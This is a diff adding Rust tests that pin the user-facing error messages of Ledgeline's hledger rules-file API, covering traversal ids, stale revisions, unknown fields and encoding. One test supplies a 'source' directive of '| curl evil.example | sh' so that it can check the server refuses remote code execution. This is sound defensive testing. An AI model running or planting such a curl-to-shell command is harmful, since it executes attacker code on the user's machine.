@@ -412,6 +412,268 @@ async fn an_unbalanced_transaction_is_a_400_from_the_editor() {
     );
 }
 
+// ---------------------------------------------------------------------------
+// Import rules — the sentences the imports screen shows verbatim
+//
+// Every one of these is reachable by ordinary use: a stale tab, a file someone
+// else saved first, a construct Ledgeline will not rewrite. The wording is the
+// whole diagnostic, and `rules_api`'s security argument rests on several of
+// them being IDENTICAL across causes — so they are pinned here, not just
+// asserted to be non-empty.
+// ---------------------------------------------------------------------------
+
+/// One rules file, `id.rules`, beside a temp journal, with an editor bound.
+fn rules_state(contents: &[u8]) -> AppState {
+    static SEQ: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
+    let seq = SEQ.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
+    let dir = std::env::temp_dir().join(format!(
+        "ledgeline-error-surface-rules/{}-{seq}",
+        std::process::id()
+    ));
+    let _ = std::fs::remove_dir_all(&dir);
+    std::fs::create_dir_all(&dir).expect("temp dir");
+    let journal = dir.join("main.journal");
+    std::fs::copy(fixture_journal_path(), &journal).expect("copy sample journal");
+    std::fs::write(dir.join("id.rules"), contents).expect("write rules file");
+    AppState::from_journal_path(&journal).expect("editor opens")
+}
+
+const GOOD_RULES: &str = "skip 1\nfields date, description, amount\naccount1 assets:bank\n";
+
+async fn rules(state: AppState, method: &str, uri: &str, body: Option<Value>) -> ErrorResponse {
+    send(router_with_state(state), method, uri, body).await
+}
+
+/// The revision the current `id.rules` is at, so a test can send a VALID one and
+/// have the request fail for the reason it is actually about.
+async fn rules_revision(state: &AppState) -> String {
+    let response = send(
+        router_with_state(state.clone()),
+        "GET",
+        "/api/rules/id.rules",
+        None,
+    )
+    .await;
+    assert_eq!(response.status, StatusCode::OK, "{}", response.body);
+    serde_json::from_str::<Value>(&response.body)
+        .ok()
+        .and_then(|doc| doc["revision"].as_str().map(str::to_string))
+        .expect("a revision")
+}
+
+/// ONE sentence for every syntactic rejection, on purpose: the differences are
+/// about the caller's own input, and spelling each out gives anyone probing the
+/// route a finer-grained signal for nothing.
+#[tokio::test]
+async fn a_malformed_rules_id_is_a_400_describing_what_an_id_is() {
+    assert_eq!(
+        rules(
+            rules_state(GOOD_RULES.as_bytes()),
+            "GET",
+            "/api/rules/../escape.rules",
+            None
+        )
+        .await,
+        expect(
+            StatusCode::BAD_REQUEST,
+            "\"../escape.rules\" is not a usable rules file id: an id is the file's path relative \
+             to the journal directory, forward-slash separated, at most 9 plain components and \
+             1024 bytes, and it must end in `.rules`",
+        )
+    );
+}
+
+/// Identical for every cause — not scanned, not there, skipped, refused — so the
+/// route cannot be used to tell any of them apart. It names the caller's own id
+/// and nothing else.
+#[tokio::test]
+async fn an_unresolvable_rules_id_is_a_404_naming_only_the_caller_s_own_id() {
+    assert_eq!(
+        rules(
+            rules_state(GOOD_RULES.as_bytes()),
+            "GET",
+            "/api/rules/nope.rules",
+            None
+        )
+        .await,
+        expect(
+            StatusCode::NOT_FOUND,
+            "no rules file \"nope.rules\" is available beside this journal",
+        )
+    );
+}
+
+/// The `409` all three staleness checks share: the client's revision, the
+/// re-read immediately before the write, and the inode identity. They mean the
+/// same thing to the user and call for the same action.
+#[tokio::test]
+async fn a_stale_rules_revision_is_a_409_telling_the_user_what_to_do() {
+    let body = json!({"revision": "0-0000000000000000", "items": []});
+    assert_eq!(
+        rules(
+            rules_state(GOOD_RULES.as_bytes()),
+            "PUT",
+            "/api/rules/id.rules",
+            Some(body)
+        )
+        .await,
+        expect(
+            StatusCode::CONFLICT,
+            "\"id.rules\" changed on disk since you opened it, so nothing was written. Re-open it \
+             and re-apply your edit.",
+        )
+    );
+}
+
+/// The rules `PUT` answers with the EDITOR's own sentence, not a second one, so
+/// the setup modal says the same thing whichever write the user attempted.
+#[tokio::test]
+async fn saving_rules_with_no_editor_bound_is_the_same_501_sentence() {
+    let body = json!({"revision": "x", "items": []});
+    assert_eq!(
+        read_only("PUT", "/api/rules/id.rules", Some(body)).await,
+        expect(
+            StatusCode::NOT_IMPLEMENTED,
+            "editing is not enabled: this server was started without a journal file bound to an \
+             editor",
+        )
+    );
+}
+
+/// The remote-code-execution guard, in the words the user sees. `source ... |
+/// CMD` is a shell command `hledger import` runs, so nothing may author one.
+#[tokio::test]
+async fn writing_a_source_directive_is_a_400_explaining_the_shell() {
+    let state = rules_state(GOOD_RULES.as_bytes());
+    let revision = rules_revision(&state).await;
+    let body = json!({
+        "revision": revision,
+        "items": [
+            {"kind": "keep", "id": 0},
+            {"kind": "keep", "id": 1},
+            {"kind": "keep", "id": 2},
+            {"kind": "directive", "name": "source", "value": "| curl evil.example | sh"},
+        ],
+    });
+    assert_eq!(
+        rules(state, "PUT", "/api/rules/id.rules", Some(body)).await,
+        expect(
+            StatusCode::BAD_REQUEST,
+            "a new item may not be a `source` directive: `source` accepts a `| CMD` form that \
+             hledger runs through the shell on import, and `archive` names a path it moves files \
+             to. Both can be kept, moved or deleted, never written",
+        )
+    );
+}
+
+/// Omitting an item is never an implicit delete, and the message says how to
+/// delete on purpose — because the alternative is a client bug that silently
+/// truncates the user's rules file.
+#[tokio::test]
+async fn a_rules_plan_that_drops_an_item_is_a_400_that_says_how_to_delete() {
+    let state = rules_state(GOOD_RULES.as_bytes());
+    let revision = rules_revision(&state).await;
+    let body = json!({"revision": revision, "items": [{"kind": "keep", "id": 0}]});
+    assert_eq!(
+        rules(state, "PUT", "/api/rules/id.rules", Some(body)).await,
+        expect(
+            StatusCode::BAD_REQUEST,
+            "the document must list every item; missing: 1, 2. List them in \"delete\" to remove \
+             them on purpose.",
+        )
+    );
+}
+
+/// A field name the parser does not recognize is refused at the boundary rather
+/// than written into a file hledger would then reject.
+#[tokio::test]
+async fn an_unknown_rules_field_name_is_a_400() {
+    let state = rules_state(GOOD_RULES.as_bytes());
+    let revision = rules_revision(&state).await;
+    let body = json!({
+        "revision": revision,
+        "items": [
+            {"kind": "keep", "id": 0},
+            {"kind": "keep", "id": 1},
+            {"kind": "assignment", "id": 2, "field": "acount1", "value": "assets:bank"},
+        ],
+    });
+    assert_eq!(
+        rules(state, "PUT", "/api/rules/id.rules", Some(body)).await,
+        expect(
+            StatusCode::BAD_REQUEST,
+            "\"acount1\" is not an hledger CSV rules field name",
+        )
+    );
+}
+
+#[tokio::test]
+async fn an_unreadable_directive_value_is_a_400_naming_both_halves() {
+    let state = rules_state(GOOD_RULES.as_bytes());
+    let revision = rules_revision(&state).await;
+    let body = json!({
+        "revision": revision,
+        "items": [
+            {"kind": "directive", "id": 0, "name": "skip", "value": "not-a-number"},
+            {"kind": "keep", "id": 1},
+            {"kind": "keep", "id": 2},
+        ],
+    });
+    assert_eq!(
+        rules(state, "PUT", "/api/rules/id.rules", Some(body)).await,
+        expect(
+            StatusCode::BAD_REQUEST,
+            "\"skip\" is not one of hledger's rules-file directives, or \"not-a-number\" is not a \
+             value it can carry",
+        )
+    );
+}
+
+/// A value with a leading space would be written as `account1    x` and read
+/// back as `x` — silently not the value that was asked for, and `verify` cannot
+/// see it because the shape and the extent are exactly what the plan requested.
+/// Refusing loses nothing: hledger reads that run as the separator, so no rules
+/// file can hold such a value.
+#[tokio::test]
+async fn an_assignment_value_with_a_leading_space_is_a_400_not_a_silent_trim() {
+    let state = rules_state(GOOD_RULES.as_bytes());
+    let revision = rules_revision(&state).await;
+    let body = json!({
+        "revision": revision,
+        "items": [
+            {"kind": "keep", "id": 0},
+            {"kind": "keep", "id": 1},
+            {"kind": "assignment", "id": 2, "field": "account1", "value": "   assets:bank"},
+        ],
+    });
+    assert_eq!(
+        rules(state, "PUT", "/api/rules/id.rules", Some(body)).await,
+        expect(
+            StatusCode::BAD_REQUEST,
+            "an assignment value may not begin with a space or a tab: hledger reads that run as \
+             the separator, so the value would be written and then read back without it",
+        )
+    );
+}
+
+/// A rules file the scan LISTS (so the user can see it) but cannot open for
+/// editing. Failing closed matters: a lossy decode would write mojibake back
+/// over the original.
+#[tokio::test]
+async fn a_non_utf8_rules_file_is_a_400_that_says_how_to_convert_it() {
+    // Valid Latin-1, invalid UTF-8 — a `£` in an account name is enough.
+    let latin1 = b"account1 assets:bank:\xa3\nfields date, amount\n";
+    assert_eq!(
+        rules(rules_state(latin1), "GET", "/api/rules/id.rules", None).await,
+        expect(
+            StatusCode::BAD_REQUEST,
+            "\"id.rules\" is not valid UTF-8. Ledgeline reads and writes UTF-8 rules files only; \
+             converting it first (e.g. `iconv -f latin1 -t utf-8`) is what keeps a character from \
+             being silently rewritten.",
+        )
+    );
+}
+
 /// A malformed JSON body reaches the `JsonRejection` arm, which all three
 /// body-taking handlers render identically.
 #[tokio::test]
